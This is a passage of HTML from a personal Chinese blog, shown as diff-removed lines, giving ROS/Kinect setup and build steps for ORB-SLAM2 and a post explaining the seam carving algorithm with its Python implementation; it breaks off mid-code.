-<p>roslaunch openni_launch openni.launch</p>
-<p>rosrun rqt_image_view rqt_image_view</p>
-<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>sudo apt-get install ros-kinetic-freenect-camera </p>
-<p>ros-kinetic-freenect-stack ros-kinetic-freenect-launch</p>
-<p>roslaunch freenect_launch freenect-registered-xyzrgb.launch</p>
-<p>rosrun rqt_image_view rqt_image_view</p>
-</blockquote>
-<h2 id="安装ORB-SLAM2"><a href="#安装ORB-SLAM2" class="headerlink" title="安装ORB-SLAM2"></a>安装ORB-SLAM2</h2><h3 id="下载源码-1"><a href="#下载源码-1" class="headerlink" title="下载源码"></a>下载源码</h3><blockquote>
-<p>git clone <a href="https://github.com/raulmur/ORB_SLAM.git" target="_blank" rel="noopener">https://github.com/raulmur/ORB_SLAM.git</a></p>
-<h3 id="修改bash"><a href="#修改bash" class="headerlink" title="修改bash"></a>修改bash</h3><p>gedit ~/.bashrc</p>
-<p>export ROS_PACKAGE_PATH=${ROS_PACKAGE_PATH}:PATH_TO_PARENT_OF_ORB_SLAM<br>(在后面添加)<br>source ~/.bashrc</p>
-<h3 id="编译build-sh"><a href="#编译build-sh" class="headerlink" title="编译build.sh"></a>编译build.sh</h3><p>修改build.sh为如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Configuring and building Thirdparty/DBoW2 ...&quot;</span><br><span class="line"></span><br><span class="line">cd Thirdparty/DBoW2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake .. -DCMAKE_BUILD_TYPE=Release</span><br><span class="line">make -j</span><br><span class="line"></span><br><span class="line">cd ../../g2o</span><br><span class="line"></span><br><span class="line">echo &quot;Configuring and building Thirdparty/g2o ...&quot;</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake .. -DCMAKE_BUILD_TYPE=Release</span><br><span class="line">make -j</span><br><span class="line"></span><br><span class="line">cd ../../../</span><br><span class="line"></span><br><span class="line">echo &quot;Uncompress vocabulary ...&quot;</span><br><span class="line"></span><br><span class="line">cd Vocabulary</span><br><span class="line">tar -xf ORBvoc.txt.tar.gz</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">echo &quot;Configuring and building ORB_SLAM2 ...&quot;</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake .. -DCMAKE_BUILD_TYPE=Release</span><br><span class="line">make -j2</span><br></pre></td></tr></table></figure></p>
-<p>chmod +x build.sh<br>./build.sh</p>
-<h3 id="如果出错则需要增加交换空间"><a href="#如果出错则需要增加交换空间" class="headerlink" title="如果出错则需要增加交换空间"></a>如果出错则需要增加交换空间</h3><p>sudo dd if=/dev/zero of=/var/swapfile1 bs=1024 count=2097152(2G可根据情况调整)</p>
-<p>sudo mkswap /var/swapfile1</p>
-<p>sudo swapon /var/swapfile1（每次重启终端需要重新挂载）</p>
-<p>free -m 用于产看swap大小</p>
-<h3 id="编译build-ros-sh"><a href="#编译build-ros-sh" class="headerlink" title="编译build_ros.sh"></a>编译build_ros.sh</h3><p>chmod +x build_ros.sh</p>
-<p>./build_ros.sh</p>
-</blockquote>
-<h2 id="运行ORB-SLAM2"><a href="#运行ORB-SLAM2" class="headerlink" title="运行ORB-SLAM2"></a>运行ORB-SLAM2</h2><h3 id="在ORB-SLAM2根目录下建立文件kinect-orbslam2-launch内容如下"><a href="#在ORB-SLAM2根目录下建立文件kinect-orbslam2-launch内容如下" class="headerlink" title="在ORB-SLAM2根目录下建立文件kinect_orbslam2.launch内容如下"></a>在ORB-SLAM2根目录下建立文件kinect_orbslam2.launch内容如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;launch&gt; </span><br><span class="line">  &lt;node pkg=&quot;ORB_SLAM2&quot; type=&quot;RGBD&quot; name=&quot;ORB_SLAM2&quot; output=&quot;screen&quot;  </span><br><span class="line">        args=&quot;/home/kaneiki/Desktop/SLAM/ORB_SLAM2/Vocabulary/ORBvoc.txt </span><br><span class="line">         /home/kaneiki/Desktop/SLAM/ORB_SLAM2/Examples/RGB-D/TUM2.yaml&quot;/&gt; </span><br><span class="line"></span><br><span class="line">  &lt;include file=&quot;$(find openni_launch)/launch/openni.launch&quot;&gt; </span><br><span class="line">    &lt;!-- use device registration --&gt; </span><br><span class="line">    &lt;arg name=&quot;depth_registration&quot; value=&quot;true&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;rgb_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;ir_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;depth_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;depth_registered_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;disparity_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;disparity_registered_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;hw_registered_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">    &lt;arg name=&quot;sw_registered_processing&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">  &lt;/include&gt; </span><br><span class="line">&lt;/launch&gt;</span><br></pre></td></tr></table></figure>
-<p><strong><em>args下两条路径根据实际情况修改</em></strong></p>
-<h3 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h3><blockquote>
-<p>roslaunch kinect_orbslam2.launch</p>
-</blockquote>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/16/SeamCarving/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/16/SeamCarving/" class="post-title-link" itemprop="url">SeamCarving</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-04-16 01:13:13" itemprop="dateCreated datePublished" datetime="2019-04-16T01:13:13+08:00">2019-04-16</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-24 21:21:21" itemprop="dateModified" datetime="2020-01-24T21:21:21+08:00">2020-01-24</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="SeamCarving算法实现"><a href="#SeamCarving算法实现" class="headerlink" title="SeamCarving算法实现"></a>SeamCarving算法实现</h1><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>每次选择梯度变化最小的一个路径删除</p>
-<h3 id="梯度的计算"><a href="#梯度的计算" class="headerlink" title="梯度的计算"></a>梯度的计算</h3><p><strong><em>g(x,y)=|dI/dx|+|dI/dy|</em></strong><br>根据这个公式可以用sobel算子求得每个位置的梯度</p>
-<h3 id="找最小权值路径"><a href="#找最小权值路径" class="headerlink" title="找最小权值路径"></a>找最小权值路径</h3><p>利用动态规划选取最小路径。由于是考虑8联通的情况,每个位置的值只会传到下方的三个位置。考虑水平方向切割,(x,y)上的值只会传递到(x,y-1),(x,y),(x,y+1)三个位置上。因此可以将每一行看成一个向量用numpy来处理来加快处理速度。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_M</span><span class="params">(self, e)</span>:</span></span><br><span class="line">        M = e.copy()</span><br><span class="line">        w, h = e.shape</span><br><span class="line">        v1 = np.zeros(h,np.float)</span><br><span class="line">        v1[<span class="number">0</span>]=float(<span class="string">'inf'</span>)</span><br><span class="line">        v2 = np.zeros(h,np.float)</span><br><span class="line">        v2[h<span class="number">-1</span>]=float(<span class="string">'inf'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, w):</span><br><span class="line">            v1[<span class="number">1</span>:h]  = M[i<span class="number">-1</span>, <span class="number">0</span>:h<span class="number">-1</span>]</span><br><span class="line">            v2[<span class="number">0</span>:h<span class="number">-1</span>] = M[i<span class="number">-1</span>, <span class="number">1</span>: h]</span><br><span class="line">            M[i] = np.min(np.stack([v1, v2, M[i<span class="number">-1</span>]], axis=<span class="number">1</span>), axis=<span class="number">1</span>)+M[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> M</span><br></pre></td></tr></table></figure></p>
-<h3 id="关于两个方向"><a href="#关于两个方向" class="headerlink" title="关于两个方向"></a>关于两个方向</h3><p>当一个方向的切割代码完成，切割另一个方向时可以现将图像转置，利用已经写好的操作切割后再转置回来。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">carve_col</span><span class="params">(self, src)</span>:</span></span><br><span class="line">        src1 = np.stack([</span><br><span class="line">            src[:, :, <span class="number">0</span>].T,</span><br><span class="line">            src[:, :, <span class="number">1</span>].T,</span><br><span class="line">            src[:, :, <span class="number">2</span>].T</span><br><span class="line">        ], axis=<span class="number">2</span>)</span><br><span class="line">        img = self.carve_row(src1)</span><br><span class="line">        img = np.stack([</span><br><span class="line">            img[:, :, <span class="number">0</span>].T,</span><br><span class="line">            img[:, :, <span class="number">1</span>].T,</span><br><span class="line">            img[:, :, <span class="number">2</span>].T</span><br><span class="line">        ], axis=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> img</span><br></pre></td></tr></table></figure>
-<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> scipy.ndimage.filters <span class="keyword">import</span> convolve <span class="keyword">as</span> _cov</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeamCarving</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># self.img = img</span></span><br><span class="line">        <span class="comment"># self.src = np.array(img, "float32")</span></span><br><span class="line">        self.dy = [</span><br><span class="line">            [<span class="number">-1</span>, <span class="number">-1</span>],</span><br><span class="line">            [<span class="number">0</span>, <span class="number">-1</span>],</span><br><span class="line">            [<span class="number">1</span>, <span class="number">-1</span>]</span><br><span class="line">        ]</span><br><span class="line">        self.dx = [</span><br><span class="line">            [<span class="number">-1</span>, <span class="number">-1</span>],</span><br><span class="line">            [<span class="number">-1</span>, <span class="number">0</span>],</span><br><span class="line">            [<span class="number">-1</span>, <span class="number">1</span>]</span><br><span class="line">        ]</span><br><span class="line">        <span class="comment"># sobel</span></span><br><span class="line">        self.filter_x = np.array([</span><br><span class="line">            [<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">-1.0</span>],</span><br><span class="line">            [<span class="number">2.0</span>, <span class="number">0.0</span>, <span class="number">-2.0</span>],</span><br><span class="line">            [<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">-1.0</span>],</span><br><span class="line">        ])</span><br><span class="line">        self.filter_y = np.array([</span><br><span class="line">            [<span class="number">-1.0</span>, <span class="number">-2.0</span>, <span class="number">-1.0</span>],</span><br><span class="line">            [<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>],</span><br><span class="line">            [<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">1.0</span>],</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convovle</span><span class="params">(self, src, filter_)</span>:</span></span><br><span class="line">        res = np.zeros(src.shape, dtype=np.float)</span><br><span class="line">        w, h = filter_.shape</span><br><span class="line">        W, H = src.shape</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(src.shape[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(src.shape[<span class="number">1</span>]):</span><br><span class="line">                tmp = np.zeros([w, h], dtype=np.float)</span><br><span class="line">                src[i-w//<span class="number">2</span>:i+w//<span class="number">2</span>+<span class="number">1</span>, j-h//<span class="number">2</span>:j+h//<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">                dw1 = min(w//<span class="number">2</span>+<span class="number">1</span>, W-i)</span><br><span class="line">                dw0 = min(w//<span class="number">2</span>, i)</span><br><span class="line">                dh1 = min(h//<span class="number">2</span>+<span class="number">1</span>, H-j)</span><br><span class="line">                dh0 = min(h//<span class="number">2</span>, j)</span><br><span class="line">                tmp[w//<span class="number">2</span>-dw0:w//<span class="number">2</span>+dw1, h//<span class="number">2</span>-dh0:h//<span class="number">2</span> +</span><br><span class="line">                    dh1] = src[i-dw0:i+dw1, j-dh0:j+dh1]</span><br><span class="line">                res[i][j] = np.sum(tmp*filter_)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_M</span><span class="params">(self, e)</span>:</span></span><br><span class="line">        M = e.copy()</span><br><span class="line">        w, h = e.shape</span><br><span class="line">        v1 = np.zeros(h,np.float)</span><br><span class="line">        v1[<span class="number">0</span>]=float(<span class="string">'inf'</span>)</span><br><span class="line">        v2 = np.zeros(h,np.float)</span><br><span class="line">        v2[h<span class="number">-1</span>]=float(<span class="string">'inf'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, w):</span><br><span class="line">            v1[<span class="number">1</span>:h]  = M[i<span class="number">-1</span>, <span class="number">0</span>:h<span class="number">-1</span>]</span><br><span class="line">            v2[<span class="number">0</span>:h<span class="number">-1</span>] = M[i<span class="number">-1</span>, <span class="number">1</span>: h]</span><br><span class="line">            M[i] = np.min(np.stack([v1, v2, M[i<span class="number">-1</span>]], axis=<span class="number">1</span>), axis=<span class="number">1</span>)+M[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_M_</span><span class="params">(self, e)</span>:</span></span><br><span class="line">        M = e.copy()</span><br><span class="line">        w, h = e.shape</span><br><span class="line">        dirt = np.zeros((w, h), dtype=np.int)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, w):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(h):</span><br><span class="line">                t = float(<span class="string">'inf'</span>)</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                    <span class="keyword">if</span> i+self.dx[_][<span class="number">0</span>] &gt;= <span class="number">0</span> <span class="keyword">and</span> i+self.dx[_][<span class="number">0</span>] &lt; w <span class="keyword">and</span> j+self.dx[_][<span class="number">1</span>] &gt;= <span class="number">0</span> <span class="keyword">and</span> j+self.dx[_][<span class="number">1</span>] &lt; h:</span><br><span class="line">                        p = M[i+self.dx[_][<span class="number">0</span>]][j+self.dx[_][<span class="number">1</span>]]+e[i][j]</span><br><span class="line">                        <span class="keyword">if</span> p &lt; t:</span><br><span class="line">                            t = p</span><br><span class="line">                            dirt[i][j] = _</span><br><span class="line">                M[i][j] = t</span><br><span class="line">        <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">carve_row</span><span class="params">(self, src)</span>:</span></span><br><span class="line">        pt = time.time()</span><br><span class="line"></span><br><span class="line">        e = self._energy(src)</span><br><span class="line"></span><br><span class="line">        nt = time.time()</span><br><span class="line">        print(nt-pt, <span class="string">"s"</span>)</span><br><span class="line">        pt = nt</span><br><span class="line"></span><br><span class="line">        w, h = e.shape</span><br><span class="line">        M = self.get_M(e)</span><br><span class="line">        <span class="comment"># print(M)</span></span><br><span class="line">        pos = np.argmin(M[w<span class="number">-1</span>])</span><br><span class="line">        <span class="comment"># print('pos', pos)</span></span><br><span class="line"></span><br><span class="line">        nt = time.time()</span><br><span class="line">        print(nt-pt, <span class="string">"s"</span>)</span><br><span class="line">        pt = nt</span><br><span class="line"></span><br><span class="line">        B = np.ones(e.shape, dtype=np.bool)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(dir)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(w)):</span><br><span class="line">            <span class="comment"># print('pos', pos)</span></span><br><span class="line">            B[i][pos] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> pos<span class="number">-1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> (int)(M[i<span class="number">-1</span>][pos<span class="number">-1</span>]) == int(M[i][pos]-e[i][pos]):</span><br><span class="line">                pos = pos<span class="number">-1</span></span><br><span class="line">            <span class="keyword">elif</span> pos+<span class="number">1</span> &lt; h <span class="keyword">and</span> (int)(M[i<span class="number">-1</span>][pos+<span class="number">1</span>]) == int(M[i][pos]-e[i][pos]):</span><br><span class="line">                pos = pos+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        B = np.stack([B]*<span class="number">3</span>, axis=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        img = src[B].reshape((w, h<span class="number">-1</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        nt = time.time()</span><br><span class="line">        print(nt-pt, <span class="string">"s"</span>)</span><br><span class="line">        pt = nt</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">carve_col</span><span class="params">(self, src)</span>:</span></span><br><span class="line">        src1 = np.stack([</span><br><span class="line">            src[:, :, <span class="number">0</span>].T,</span><br><span class="line">            src[:, :, <span class="number">1</span>].T,</span><br><span class="line">            src[:, :, <span class="number">2</span>].T</span><br><span class="line">        ], axis=<span class="number">2</span>)</span><br><span class="line">        img = self.carve_row(src1)</span><br><span class="line">        img = np.stack([</span><br><span class="line">            img[:, :, <span class="number">0</span>].T,</span><br><span class="line">            img[:, :, <span class="number">1</span>].T,</span><br><span class="line">            img[:, :, <span class="number">2</span>].T</span><br><span class="line">        ], axis=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">carve</span><span class="params">(self, src, len, Axis)</span>:</span></span><br><span class="line">        img = np.array(src, dtype=np.float)</span><br><span class="line">        <span class="comment"># print(img)</span></span><br><span class="line">        <span class="keyword">if</span> Axis == <span class="string">'x'</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(len):</span><br><span class="line">                <span class="comment"># print(_)</span></span><br><span class="line">                img = self.carve_row(img)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> Axis == <span class="string">'y'</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(len):</span><br><span class="line">                <span class="comment"># print(_)</span></span><br><span class="line">                img = self.carve_col(img)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> img.astype(np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">energy</span><span class="params">(self, src)</span>:</span></span><br><span class="line">        W, H, Z = src.shape</span><br><span class="line">        e = np.stack([np.abs(_cov(src[:, :, <span class="number">0</span>], self.filter_x)) +</span><br><span class="line">                      np.abs(_cov(src[:, :, <span class="number">0</span>], self.filter_y)),</span><br><span class="line">                      np.abs(_cov(src[:, :, <span class="number">1</span>], self.filter_x)) +</span><br><span class="line">                      np.abs(_cov(src[:, :, <span class="number">1</span>], self.filter_y)),</span><br><span class="line">                      np.abs(_cov(src[:, :, <span class="number">2</span>], self.filter_x)) +</span><br><span class="line">                      np.abs(_cov(src[:, :, <span class="number">2</span>], self.filter_y))</span><br><span class="line">                      ], axis=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        e = np.sum(e, axis=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># self.show(e, "carve")</span></span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def show(self, src, title):</span></span><br><span class="line">    <span class="comment">#     cv2.imshow(title, src.astype(np.uint8))</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_energy</span><span class="params">(self, src)</span>:</span></span><br><span class="line">        W, H, Z = src.shape</span><br><span class="line">        filter_x = np.stack([self.filter_x]*<span class="number">3</span>, axis=<span class="number">2</span>)</span><br><span class="line">        filter_y = np.stack([self.filter_y]*<span class="number">3</span>, axis=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        e = np.absolute(_cov(src, filter_x))+np.absolute(_cov(src, filter_y))</span><br><span class="line">        e = np.sum(e, axis=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    img = cv2.imread(</span><br><span class="line">        <span class="string">"/Users/kaneiki/Desktop/Image_Processing/imgs/carving.png"</span>)</span><br><span class="line">    <span class="comment"># cv2.imshow("raw", np.array(img))</span></span><br><span class="line">    <span class="comment"># src=np.array(img,np.uint8)</span></span><br><span class="line">    print(img.shape)</span><br><span class="line"></span><br><span class="line">    test = SeamCarving()</span><br><span class="line"></span><br><span class="line">    stat = time.time()</span><br><span class="line">    res = test.carve(img, <span class="number">100</span>, <span class="string">'x'</span>)</span><br><span class="line">    print(time.time()-stat, <span class="string">"s"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># res = test.carve(img, 10, 'y')</span></span><br><span class="line">    print(res.shape)</span><br><span class="line">    <span class="comment"># cv2.imshow("res", res)</span></span><br><span class="line"></span><br><span class="line">    t = np.hstack([res, img])</span><br><span class="line">    